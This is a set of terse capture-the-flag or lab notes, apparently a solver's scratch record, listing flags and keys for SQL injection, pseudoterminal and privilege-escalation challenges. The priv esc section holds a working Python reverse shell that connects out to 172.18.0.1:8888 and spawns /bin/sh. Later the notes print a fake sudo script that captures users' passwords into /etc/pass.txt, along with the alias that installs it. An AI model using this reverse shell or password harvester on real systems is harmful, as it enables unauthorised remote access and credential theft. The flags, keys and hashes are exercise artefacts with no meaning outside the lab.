# Found these vulnerabilities:

* the attacker after he made his operation left a way to trigger and spawn a reverse shell to have a persistance on the server. In order to reach this goal the attacker saved in the test_comment.php file an eval expression (function that allows to execute code from string) encoded in base64, decoding there will be the following malicious code



root flag
Key:
pIsTOK52x5NH8Um7e1a2PQV8JVn6qeoC

Data:
110bf4e37f4133c7e6bcb6e3b326322b4cded14fd80c3f64ef34e64090adb568

#######################################


<!-- ||K||E||Y||-->
                    <!-- 5Mk3rXNhMC8Osgpki3iOcdVTkSAIMdxE -->
426ce929ea051285e551eaf2b2de2bf463ae78456fa3b64adb5fd2214d985e34


sqli
nujnlhrZZKidXugUkCtiUgqDMuoDbnA3
cc5713089b0a9335111f55bd25e39130b843dabadf63e1170c668d0a4a6d5e37
{FLAG_INTWEBSI_SQLI_306481}

python pseudoterminal
IUt0zFZKcPsLo2yek7OgSpockEd80LOA
73b0c826e8be11fa266896bb1150d1844f88fc5458de5a0546b1a2344e9a57b8
{FLAG_PSEUTERM_COIN_256579}

priv esc
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("172.18.0.1",8888));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")


/host # ls
flag.txt      johnsysadmin
/host # cat flag.txt
Key:
pIsTOK52x5NH8Um7e1a2PQV8JVn6qeoC
Data:
110bf4e37f4133c7e6bcb6e3b326322b4cded14fd80c3f64ef34e64090adb568/host #
{FLAG_PSEUTERM_MISC_359867}


/host/johnsysadmin # cd .locale/
/host/johnsysadmin/.locale # ls
fsudo
/host/johnsysadmin/.locale # cat fsudo
read -sp "[sudo] password for $USER: " sudopass
echo ""
#991b5887ab76f9fa6061ee44d2d20a8e42de631308853f38f5883e36c8b1d3bc
sleep 2
echo "Sorry, try again."
echo $sudopass >> /etc/pass.txt
---------
alias sudo=/home/johnsysadmin/.locale/fsudo
#((K))((E))((Y)) --> 30sCHumIfzWRhhoKRoyFTa7Yx0LaXvmu
{FLAG_MAINHOST_FASU_172836}
